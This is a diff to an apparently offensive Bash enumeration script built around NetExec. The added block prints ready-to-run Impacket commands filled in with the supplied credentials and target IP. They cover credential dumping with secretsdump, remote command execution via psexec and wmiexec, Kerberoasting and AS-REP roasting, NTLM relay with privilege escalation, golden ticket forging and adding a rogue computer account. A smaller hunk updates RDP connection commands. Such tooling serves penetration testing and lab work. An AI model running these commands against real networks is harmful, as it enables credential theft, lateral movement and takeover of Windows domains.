@@ -91,6 +91,96 @@ echo -e "\n\033[96m[+] Target OS Type:\033[0m $os_type"
 echo -e "\n\033[96m[+] Logging Enabled:\033[0m `pwd`/nxc-enum\n"
 mkdir -p nxc-enum nxc-enum/smb nxc-enum/ldap
 
+# Show Impacket tools suggestions if credentials provided
+if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
+    echo -e "\n\033[96m[+] Impacket Tools - Quick Reference:\033[0m"
+    echo ""
+    
+    # Build credential string
+    if [ -n "$hash" ]; then
+        cred_string="$user -hashes :$hash"
+    else
+        cred_string="$user:$pass"
+    fi
+    
+    if [ -n "$domain" ]; then
+        target="$domain/$cred_string@$IP"
+        target_simple="$domain/$user@$IP"
+    else
+        target="$cred_string@$IP"
+        target_simple="$user@$IP"
+    fi
+    
+    echo "# 1. Credential Dumping:"
+    echo "impacket-secretsdump $target                    # Dump SAM/LSA/NTDS"
+    echo "impacket-secretsdump -just-dc $target           # Only NTDS (faster)"
+    echo "impacket-secretsdump -just-dc-ntlm $target      # Only NTLM hashes"
+    echo ""
+    
+    echo "# 2. Remote Command Execution:"
+    echo "impacket-psexec $target                         # Execute via Service Manager"
+    echo "impacket-wmiexec $target                        # Execute via WMI"
+    echo "impacket-smbexec $target                        # Execute via SMB"
+    echo "impacket-dcomexec $target                       # Execute via DCOM"
+    echo "impacket-atexec $target 'whoami'                # Execute via Task Scheduler"
+    echo ""
+    
+    echo "# 3. Kerberos Attacks:"
+    if [ -n "$domain" ]; then
+        echo "impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass -dc-ip $IP  # AS-REP roasting"
+        echo "impacket-GetUserSPNs $target -dc-ip $IP -request                       # Kerberoasting"
+        echo "impacket-getTGT $domain/$cred_string -dc-ip $IP                        # Request TGT"
+        echo "impacket-getST $domain/$cred_string -spn cifs/$IP -dc-ip $IP           # Request Service Ticket"
+    else
+        echo "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP"
+        echo "impacket-GetUserSPNs DOMAIN/$cred_string@$IP -dc-ip $IP -request"
+        echo "impacket-getTGT DOMAIN/$cred_string -dc-ip $IP"
+    fi
+    echo ""
+    
+    echo "# 4. SMB/File Operations:"
+    echo "impacket-smbclient $target                      # Interactive SMB client"
+    echo "impacket-smbserver share \$(pwd) -smb2support    # Start SMB server (for file transfer)"
+    echo "impacket-lookupsid $target                      # Enumerate users via SID"
+    echo "impacket-reg $target query -keyName HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion  # Query registry"
+    echo ""
+    
+    echo "# 5. LDAP/AD Enumeration:"
+    echo "impacket-GetADUsers $target -all -dc-ip $IP     # Dump all AD users"
+    echo "impacket-GetADComputers $target -all -dc-ip $IP # Dump all computers"
+    echo "impacket-dacledit $target -action read -principal Administrator -dc-ip $IP  # Read ACLs"
+    echo "impacket-findDelegation $target -dc-ip $IP      # Find delegation"
+    echo ""
+    
+    echo "# 6. MSSQL Attacks:"
+    echo "impacket-mssqlclient $target                    # Interactive MSSQL client"
+    echo "impacket-mssqlclient $target -windows-auth      # Windows authentication"
+    echo ""
+    
+    echo "# 7. Network Attacks:"
+    echo "impacket-ntlmrelayx -tf targets.txt -smb2support                    # NTLM relay"
+    echo "impacket-ntlmrelayx -t ldap://$IP --escalate-user $user             # LDAP relay + escalation"
+    echo "impacket-rpcdump $IP                                                # Enumerate RPC endpoints"
+    echo "impacket-samrdump $target                                           # Dump SAM via RPC"
+    echo ""
+    
+    echo "# 8. Ticket Manipulation (if you have tickets):"
+    echo "impacket-ticketConverter ticket.kirbi ticket.ccache                 # Convert ticket format"
+    echo "impacket-ticketer -nthash <hash> -domain-sid <sid> -domain $domain Administrator  # Golden ticket"
+    echo ""
+    
+    echo "# 9. Other Useful Tools:"
+    echo "impacket-addcomputer $target -computer-name 'EVILPC$' -computer-pass 'Password123'  # Add computer account"
+    echo "impacket-exchanger $target -ah $IP                                  # Exchange exploitation"
+    echo "impacket-netview $target                                            # Network enumeration"
+    echo "impacket-services $target list                                      # List services"
+    echo ""
+    
+    echo -e "\033[93m[!] Note: Replace DOMAIN with actual domain name if not provided\033[0m"
+    echo -e "\033[96m[+] For full list: ls /usr/share/doc/python3-impacket/examples/\033[0m"
+    echo ""
+fi
+
 echo -e "\n\033[96m[+] OS info, Name, Domain, SMB versions\033[0m\n"
 # checks if the SMB service is running; returns OS info, name, domain, SMB versions
 
@@ -637,9 +727,9 @@ if [ "$os_type" = "windows" ]; then
         if echo "$rdp_output" | grep -q "\[+\]"; then
             echo -e "\n\033[92m[+] RDP access successful! Connect with:\033[0m"
             if [ -n "$domain" ]; then
-                echo "xfreerdp /v:$IP /u:$domain\\\\$user /p:'$pass' /cert-ignore +clipboard /dynamic-resolution"
+                echo "xfreerdp3 /v:$IP /u:$domain\\\\$user /p:'$pass' /cert:ignore /clipboard /dynamic-resolution"
             else
-                echo "xfreerdp /v:$IP /u:$user /p:'$pass' /cert-ignore +clipboard /dynamic-resolution"
+                echo "xfreerdp3 /v:$IP /u:$user /p:'$pass' /cert:ignore /clipboard /dynamic-resolution"
             fi
             echo ""
             echo "# Or with rdesktop:"
